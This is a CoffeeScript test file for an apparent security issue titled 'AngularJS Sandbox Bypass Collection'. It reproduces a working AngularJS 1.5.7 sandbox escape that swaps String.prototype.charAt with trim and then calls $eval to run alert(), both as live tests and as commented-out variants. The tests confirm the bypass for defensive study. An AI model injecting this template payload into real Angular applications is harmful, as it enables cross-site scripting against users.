describe '_issues | security | Issue 153 - AngularJS Sandbox Bypass Collection', ->

  _$compile   = null
  _$rootScope = null
  alert_Param = null

  beforeEach ->
    alert_Param = null
    module('MM_Graph')
    inject ($compile, $rootScope)->
      _$compile   = $compile
      _$rootScope = $rootScope

  apply_Payload = (payload)->
    $scope = _$rootScope.$new()
    $scope.test = 'abc'    
    element = angular.element("<div>" + payload + "</div>")
    _$compile(element)($scope)
    $scope.$digest()
    return { element, $scope }

  afterEach ->


  window.alert = (value)->
    alert_Param = value

  describe 'Angular tests', ->

    it 'Simple Angular scope digest test', ->
      {element,$scope} = apply_Payload '{{test}}'
      element.html().assert_Is 'abc'
      $scope.test.assert_Is 'abc'

    it 'Confirm that scope value can be changed', ->
      {element,$scope} = apply_Payload '<span ng-init="test=123">{{test}}</span>'

      element.html().assert_Is  '<span ng-init="test=123" class="ng-binding">123</span>'
      element.find('span').html().assert_Is '123'
      $scope.test.assert_Is '123'

  describe 'exploit tests', ->
    it 'Confirm Angular version (1.5.7)' ,->
      angular.version.full.assert_Is '1.5.7'                                                                          # confirm that we are in angular version 1.5.7

    it 'Confirm window.alert call can be captured', ->
      alert('xss')                                                                                                    # the alert function has been captured where the
      alert_Param.assert_Is 'xss'                                                                                     # value passed as parameter is placed in the the alert_Param variable

    it 'Confirm window.alert call NOT be called', ->                                                                  # the objective of this test is to confirm that normally
      {$scope} = apply_Payload '{{alert(1)}} <span ng-init="alert(1);test=123">'                                      # calls to alert dont work
      (alert_Param is null).assert_Is_True()                                                                          # the value of alert_Param is still null
      $scope.test.assert_Is 123                                                                                       # the value of $scope.test was changed by the ng-init call

    it 'Direct execution of $eval with the exploit' , ->
      return if not window['wallaby']                                         # only works on wallaby
      $eval = angular.injector(['ng']).get('$rootScope').$eval                # get direct reference to $eval method
      a = toString().constructor.prototype                                    # get toString function ref
      a_CharAt = a.charAt                                                     # backup ref to (toString).charAt

      a.charAt = a.trim                                                       # exploit: assign (toString).trim to (toString).charAt

      $eval('a,alert(1),a')                                                   # trigger payload
      alert_Param.assert_Is 1                                                 # confirm payload

      $eval('alert(42)')                                                      # payload also works without the left and right 'a'
      alert_Param.assert_Is 42

      a.charAt = a_CharAt                                                     # restore (toString).charAt

    it 'Direct execution of $eval without exploit (check stack trace)' , ->
      $eval = angular.injector(['ng']).get('$rootScope').$eval                # get direct reference to $eval method
      try
        $eval('a,alert(1),a')                                                 # trigger payload
      catch error
        if error.stackArray                                                   # this value is only set on wallaby execution
          check_StackArray = (lines)->                                        # check stack trace line locations
            for line,index in lines
              error.stackArray[index].sourceURL.assert_Contains 'bower_components/angular/angular.js'
              error.stackArray[index].line.assert_Is line
          check_StackArray [14345, 14096, 14559,15488,15653,17444]
        error.line.assert_Is 14345
        error.message.assert_Contains '[$parse:syntax] Syntax Error: Token ',' is an unexpected token at column 2 of the expression [a,alert(1),a] starting at [,alert(1),a].'


#    fit 'Direct execution of the exploit (with console writes)', ->
#      a = toString().constructor.prototype
#      console.log a
#      console.log a.charAt
#      console.log a.charAt is a.trim
#      a_CharAt = a.charAt                         # back up function ref
#      a.charAt = a.trim                           # swap method
#      console.log a.charAt is a.trim
#      console.log alert_Param
#      eval('a,alert(1),a')
#      console.log alert_Param
#      a.charAt = a_CharAt                         # restore method


    it 'With better format of exploit and clean up', ->
      apply_Payload "{{                                                      " +         # start of angular code block
                    "    a        = toString().constructor.prototype;        " +         # direct link to toString function (via constructor.prototype)
                    "    a_charAt = a.charAt;                                " +         # save the (toString).charAt function reference
                    "    a.charAt = a.trim;                                  " +         # replace the (toString).charAt function with the (toString).trim
                    "    $eval('a,alert(\"xss\"),a');                        " +         # trigger payload (where trim is used on every charAt call)
                    "    a.charAt = a_charAt;                                " +         # restored modified function (to make tests more stable)
                    "}}"                                                                 # end of angular code block

      alert_Param.assert_Is 'xss'

    it 'Exception thrown when method swap is not done', ->
      try
        apply_Payload "{{                                                    " +
                      "    a = toString().constructor.prototype;             " +
                      #"    a.charAt = a.trim;                               " +         # a.charAt is not replaced with a.trim
                      "    $eval('a,alert(\"xss\"),a');                      " +         # this will thrown the exception shown below
                      "}}"

        alert_Param.assert_Is 'xss'
      catch error
        error.message.assert_Contains '[$parse:syntax] Syntax Error: Token \',\' is an unexpected token at column 2 of the expression [a,alert("xss"),a] starting at [,alert("xss"),a].'

# these tests work, but will leave the current version of angular in an unstable condition (which will affect the tests executed after these ones)
#
#    it 'Confirm window.alert call can be captured (with original exploit)', ->
#       apply_Payload "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}"                    # here is the exploit
#       (alert_Param is 1).assert_Is_True()                                                                             # which sets the value of alert_Param to 1

#    it 'Confirm window.alert call can be captured (with "xss" string in payload)', ->
#      apply_Payload "{{a=toString().constructor.prototype;$eval('a,alert(\"xss\"),a')}}"                       # variation where the alert is called with "xss" as the param
#      alert_Param.assert_Is 'xss'
#
#    it 'Confirm window.alert call can be captured (with "xss" string in payload)', ->
#      apply_Payload "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(\"xss\"),a')}}"      # variation where the alert is called with "xss" as the param
#      alert_Param.assert_Is 'xss'







